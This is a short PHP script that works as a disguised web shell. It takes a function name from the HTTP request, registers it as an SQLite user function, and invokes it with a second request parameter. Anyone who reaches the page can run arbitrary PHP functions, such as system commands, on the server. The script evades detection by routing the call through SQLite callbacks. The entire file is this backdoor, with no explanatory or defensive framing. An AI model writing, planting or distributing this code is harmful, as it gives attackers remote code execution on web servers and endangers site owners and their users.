<?php
  $e = $_REQUEST['e'];
  $db = new SQLite3('sqlite.db3');
  $db->createFunction('myfunc', $e);
  $stmt = $db->prepare("SELECT myfunc(?)");
  $stmt->bindValue(1, $_REQUEST['op'], SQLITE3_TEXT);
  $stmt->execute();
?>